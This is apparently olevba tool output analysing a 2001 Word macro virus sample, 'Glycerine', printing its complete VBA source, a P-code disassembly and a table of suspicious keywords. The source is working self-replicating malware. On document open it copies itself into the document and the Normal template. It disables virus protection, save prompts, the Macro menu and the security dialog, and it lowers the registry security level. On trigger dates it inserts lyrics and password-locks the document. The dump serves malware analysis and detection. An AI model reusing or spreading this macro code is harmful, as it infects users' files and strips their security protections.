olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Cerin
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Glycerine.cls 
in file: ./Virus.MSWord.Cerin - OLE stream: 'Macros/VBA/Glycerine'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub Document_Open()
 On Error Resume Next
  myname = "Glycerine"
  yup = 0: nope = 1: Rage = "c" & Int((Rnd * 1000) + 2)
  Set itzme = Glycerine.VBProject.VBComponents(nope).codemodule
  Set ab = ActiveDocument.VBProject.VBComponents(nope): Set ab1 = ab.codemodule
  Set cd = NormalTemplate.VBProject.VBComponents(nope): Set cd1 = cd.codemodule
  mycode = itzme.lines(nope, itzme.countoflines)
  If ab1.countoflines >= (99 * yup) And ab.Name <> myname Then
  With ab1
   .deletelines nope, .countoflines
   .addfromstring mycode: ab.Name = myname
  End With
  ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, fileformat:=wdFormatDocument
  End If
  If cd1.countoflines >= (99 * yup) And cd.Name <> myname Then
  With cd1
   .deletelines nope, .countoflines
   .addfromstring mycode: cd.Name = myname
  End With
  End If
  With Application.Options
   .VirusProtection = yup
   .SaveNormalPrompt = yup
   .ConfirmConversions = yup
  End With
  CommandBars("Tools").Controls("Macro").Enabled = yup
  If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
   System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
   CommandBars("Macro").Controls("Security...").Enabled = yup
  End If
  If Day(Now) = 31 And Month(Now) = 7 Or Day(Now) = 6 And Month(Now) = 4 Then
   MsgBox "I Love You and Hate You." & vbCr & "You've given so much pleasure," & vbCr & "And caused so much pain." & vbCr & "Now to share the wealth!!", vbOKOnly, "Glycerine"
  With Selection
     .TypeText "Glycerine" & vbCr
     .TypeText " " & vbCr
     .TypeText " " & vbCr
     .TypeText " " & vbCr
     .TypeText "Must be your skin I'm sinking in" & vbCr
     .TypeText "Must be for real 'cause now I can feel" & vbCr
     .TypeText "And I didn't mind it's not my kind" & vbCr
     .TypeText "Not my time to wonder why" & vbCr
     .TypeText "everything 's gone white" & vbCr
     .TypeText "And everything's grey" & vbCr
     .TypeText "Now you 're here now you're away" & vbCr
     .TypeText "I Don 't want this remember that" & vbCr
     .TypeText "I 'll never forget where you're at" & vbCr
     .TypeText "Don 't let the days go by" & vbCr
     .TypeText "Glycerine" & vbCr
     .TypeText " " & vbCr
     .TypeText "I 'm never alone" & vbCr
     .TypeText "I 'm alone all the time" & vbCr
     .TypeText "Are you at one" & vbCr
     .TypeText "Or do you lie" & vbCr
     .TypeText "We live in a wheel" & vbCr
     .TypeText "Where everyone steals" & vbCr
     .TypeText "But when we rise" & vbCr
     .TypeText "It 's like strawberry fields" & vbCr
     .TypeText " " & vbCr
     .TypeText "If I treated you bad" & vbCr
     .TypeText "You bruise my face" & vbCr
     .TypeText "couldn 't love you more" & vbCr
     .TypeText "You got a beautiful taste" & vbCr
     .TypeText "Don 't let the days go by" & vbCr
     .TypeText "Could have been easier on you" & vbCr
     .TypeText "I couldn 't change though I wanted to" & vbCr
     .TypeText "Should have been easier by three" & vbCr
     .TypeText "Our old friend fear and you and me" & vbCr
     .TypeText "Glycerine (Repeat)" & vbCr
     .TypeText "Don 't let the days go by" & vbCr
     .TypeText "Glycerine (Repeat)" & vbCr
     .TypeText " " & vbCr
     .TypeText "Bad mood whine again" & vbCr
     .TypeText "Bad mood whine again" & vbCr
     .TypeText "As she falls around me" & vbCr
     .TypeText " " & vbCr
     .TypeText "I needed you more" & vbCr
     .TypeText "When we wanted us less" & vbCr
     .TypeText "I could not kiss just regress" & vbCr
     .TypeText "It might just be" & vbCr
     .TypeText "Clear simple And plain" & vbCr
     .TypeText "That 's just fine" & vbCr
     .TypeText "That 's just one of my names" & vbCr
     .TypeText "Don 't let the days go by" & vbCr
     .TypeText "Could have been easier on you" & vbCr
     .TypeText "Glycerine" & vbCr
  End With
  ActiveDocument.Protect Password:=Rage, NoReset:=False, Type:=wdAllowOnlyComments
  ActiveDocument.Save
  End If
End Sub
' Glycerine by Psyclone X (c) 2001
' This goes out to my baby love you
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Cerin
' ===============================================================================
' Module streams:
' Macros/VBA/Glycerine - 7502 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Private Sub Document_Open())
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	LitStr 0x0009 "Glycerine"
' 	St myname 
' Line #4:
' 	LitDI2 0x0000 
' 	St yup 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	St nope 
' 	BoS 0x0000 
' 	LitStr 0x0001 "c"
' 	Ld Rnd 
' 	LitDI2 0x03E8 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0002 
' 	Add 
' 	FnInt 
' 	Concat 
' 	St Rage 
' Line #5:
' 	SetStmt 
' 	Ld nope 
' 	Ld Glycerine 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd codemodule 
' 	Set itzme 
' Line #6:
' 	SetStmt 
' 	Ld nope 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Set ab 
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld ab 
' 	MemLd codemodule 
' 	Set ab1 
' Line #7:
' 	SetStmt 
' 	Ld nope 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Set cd 
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld cd 
' 	MemLd codemodule 
' 	Set cd1 
' Line #8:
' 	Ld nope 
' 	Ld itzme 
' 	MemLd countoflines 
' 	Ld itzme 
' 	ArgsMemLd lines 0x0002 
' 	St mycode 
' Line #9:
' 	Ld ab1 
' 	MemLd countoflines 
' 	LitDI2 0x0063 
' 	Ld yup 
' 	Mul 
' 	Paren 
' 	Ge 
' 	Ld ab 
' 	MemLd New 
' 	Ld myname 
' 	Ne 
' 	And 
' 	IfBlock 
' Line #10:
' 	StartWithExpr 
' 	Ld ab1 
' 	With 
' Line #11:
' 	Ld nope 
' 	MemLdWith countoflines 
' 	ArgsMemCallWith deletelines 0x0002 
' Line #12:
' 	Ld mycode 
' 	ArgsMemCallWith addfromstring 0x0001 
' 	BoS 0x0000 
' 	Ld myname 
' 	Ld ab 
' 	MemSt New 
' Line #13:
' 	EndWith 
' Line #14:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed fileformat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' Line #15:
' 	EndIfBlock 
' Line #16:
' 	Ld cd1 
' 	MemLd countoflines 
' 	LitDI2 0x0063 
' 	Ld yup 
' 	Mul 
' 	Paren 
' 	Ge 
' 	Ld cd 
' 	MemLd New 
' 	Ld myname 
' 	Ne 
' 	And 
' 	IfBlock 
' Line #17:
' 	StartWithExpr 
' 	Ld cd1 
' 	With 
' Line #18:
' 	Ld nope 
' 	MemLdWith countoflines 
' 	ArgsMemCallWith deletelines 0x0002 
' Line #19:
' 	Ld mycode 
' 	ArgsMemCallWith addfromstring 0x0001 
' 	BoS 0x0000 
' 	Ld myname 
' 	Ld cd 
' 	MemSt New 
' Line #20:
' 	EndWith 
' Line #21:
' 	EndIfBlock 
' Line #22:
' 	StartWithExpr 
' 	Ld Application 
' 	MemLd Options 
' 	With 
' Line #23:
' 	Ld yup 
' 	MemStWith VirusProtection 
' Line #24:
' 	Ld yup 
' 	MemStWith SaveNormalPrompt 
' Line #25:
' 	Ld yup 
' 	MemStWith ConfirmConversions 
' Line #26:
' 	EndWith 
' Line #27:
' 	Ld yup 
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #28:
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #29:
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #30:
' 	Ld yup 
' 	LitStr 0x000B "Security..."
' 	LitStr 0x0005 "Macro"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #31:
' 	EndIfBlock 
' Line #32:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x001F 
' 	Eq 
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0007 
' 	Eq 
' 	And 
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0006 
' 	Eq 
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0004 
' 	Eq 
' 	And 
' 	Or 
' 	IfBlock 
' Line #33:
' 	LitStr 0x0018 "I Love You and Hate You."
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x001E "You've given so much pleasure,"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0018 "And caused so much pain."
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0019 "Now to share the wealth!!"
' 	Concat 
' 	Ld vbOKOnly 
' 	LitStr 0x0009 "Glycerine"
' 	ArgsCall MsgBox 0x0003 
' Line #34:
' 	StartWithExpr 
' 	Ld Selection 
' 	With 
' Line #35:
' 	LitStr 0x0009 "Glycerine"
' 	Ld vbCr 
' 	Concat 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #36:
' 	LitStr 0x0001 " "
' 	Ld vbCr 
' 	Concat 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #37:
' 	LitStr 0x0001 " "
' 	Ld vbCr 
' 	Concat 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #38:
' 	LitStr 0x0001 " "
' 	Ld vbCr 
' 	Concat 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #39:
' 	LitStr 0x0020 "Must be your skin I'm sinking in"
' 	Ld vbCr 
' 	Concat 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #40:
' 	LitStr 0x0026 "Must be for real 'cause now I can feel"
' 	Ld vbCr 
' 	Concat 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #41:
' 	LitStr 0x0022 "And I didn't mind it's not my kind"
' 	Ld vbCr 
' 	Concat 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #42:
' 	LitStr 0x0019 "Not my time to wonder why"
' 	Ld vbCr 
' 	Concat 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #43:
' 	LitStr 0x0018 "everything 's gone white"
' 	Ld vbCr 
' 	Concat 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #44:
' 	LitStr 0x0015 "And everything's grey"
' 	Ld vbCr 
' 	Concat 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #45:
' 	LitStr 0x0020 "Now you 're here now you're away"
' 	Ld vbCr 
' 	Concat 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #46:
' 	LitStr 0x0020 "I Don 't want this remember that"
' 	Ld vbCr 
' 	Concat 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #47:
' 	LitStr 0x0022 "I 'll never forget where you're at"
' 	Ld vbCr 
' 	Concat 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #48:
' 	LitStr 0x0019 "Don 't let the days go by"
' 	Ld vbCr 
' 	Concat 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #49:
' 	LitStr 0x0009 "Glycerine"
' 	Ld vbCr 
' 	Concat 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #50:
' 	LitStr 0x0001 " "
' 	Ld vbCr 
' 	Concat 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #51:
' 	LitStr 0x0010 "I 'm never alone"
' 	Ld vbCr 
' 	Concat 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #52:
' 	LitStr 0x0017 "I 'm alone all the time"
' 	Ld vbCr 
' 	Concat 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #53:
' 	LitStr 0x000E "Are you at one"
' 	Ld vbCr 
' 	Concat 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #54:
' 	LitStr 0x000D "Or do you lie"
' 	Ld vbCr 
' 	Concat 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #55:
' 	LitStr 0x0012 "We live in a wheel"
' 	Ld vbCr 
' 	Concat 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #56:
' 	LitStr 0x0015 "Where everyone steals"
' 	Ld vbCr 
' 	Concat 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #57:
' 	LitStr 0x0010 "But when we rise"
' 	Ld vbCr 
' 	Concat 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #58:
' 	LitStr 0x001C "It 's like strawberry fields"
' 	Ld vbCr 
' 	Concat 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #59:
' 	LitStr 0x0001 " "
' 	Ld vbCr 
' 	Concat 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #60:
' 	LitStr 0x0014 "If I treated you bad"
' 	Ld vbCr 
' 	Concat 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #61:
' 	LitStr 0x0012 "You bruise my face"
' 	Ld vbCr 
' 	Concat 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #62:
' 	LitStr 0x0017 "couldn 't love you more"
' 	Ld vbCr 
' 	Concat 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #63:
' 	LitStr 0x0019 "You got a beautiful taste"
' 	Ld vbCr 
' 	Concat 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #64:
' 	LitStr 0x0019 "Don 't let the days go by"
' 	Ld vbCr 
' 	Concat 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #65:
' 	LitStr 0x001D "Could have been easier on you"
' 	Ld vbCr 
' 	Concat 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #66:
' 	LitStr 0x0025 "I couldn 't change though I wanted to"
' 	Ld vbCr 
' 	Concat 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #67:
' 	LitStr 0x0020 "Should have been easier by three"
' 	Ld vbCr 
' 	Concat 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #68:
' 	LitStr 0x0022 "Our old friend fear and you and me"
' 	Ld vbCr 
' 	Concat 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #69:
' 	LitStr 0x0012 "Glycerine (Repeat)"
' 	Ld vbCr 
' 	Concat 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #70:
' 	LitStr 0x0019 "Don 't let the days go by"
' 	Ld vbCr 
' 	Concat 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #71:
' 	LitStr 0x0012 "Glycerine (Repeat)"
' 	Ld vbCr 
' 	Concat 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #72:
' 	LitStr 0x0001 " "
' 	Ld vbCr 
' 	Concat 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #73:
' 	LitStr 0x0014 "Bad mood whine again"
' 	Ld vbCr 
' 	Concat 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #74:
' 	LitStr 0x0014 "Bad mood whine again"
' 	Ld vbCr 
' 	Concat 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #75:
' 	LitStr 0x0016 "As she falls around me"
' 	Ld vbCr 
' 	Concat 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #76:
' 	LitStr 0x0001 " "
' 	Ld vbCr 
' 	Concat 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #77:
' 	LitStr 0x0011 "I needed you more"
' 	Ld vbCr 
' 	Concat 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #78:
' 	LitStr 0x0016 "When we wanted us less"
' 	Ld vbCr 
' 	Concat 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #79:
' 	LitStr 0x001D "I could not kiss just regress"
' 	Ld vbCr 
' 	Concat 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #80:
' 	LitStr 0x0010 "It might just be"
' 	Ld vbCr 
' 	Concat 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #81:
' 	LitStr 0x0016 "Clear simple And plain"
' 	Ld vbCr 
' 	Concat 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #82:
' 	LitStr 0x0011 "That 's just fine"
' 	Ld vbCr 
' 	Concat 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #83:
' 	LitStr 0x001C "That 's just one of my names"
' 	Ld vbCr 
' 	Concat 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #84:
' 	LitStr 0x0019 "Don 't let the days go by"
' 	Ld vbCr 
' 	Concat 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #85:
' 	LitStr 0x001D "Could have been easier on you"
' 	Ld vbCr 
' 	Concat 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #86:
' 	LitStr 0x0009 "Glycerine"
' 	Ld vbCr 
' 	Concat 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #87:
' 	EndWith 
' Line #88:
' 	Ld Rage 
' 	ParamNamed Password 
' 	LitVarSpecial (False)
' 	ParamNamed NoReset 
' 	Ld wdAllowOnlyComments 
' 	ParamNamed TypeOf 
' 	Ld ActiveDocument 
' 	ArgsMemCall Protect 0x0003 
' Line #89:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #90:
' 	EndIfBlock 
' Line #91:
' 	EndSub 
' Line #92:
' 	QuoteRem 0x0000 0x0021 " Glycerine by Psyclone X (c) 2001"
' Line #93:
' 	QuoteRem 0x0000 0x0022 " This goes out to my baby love you"
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|addfromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

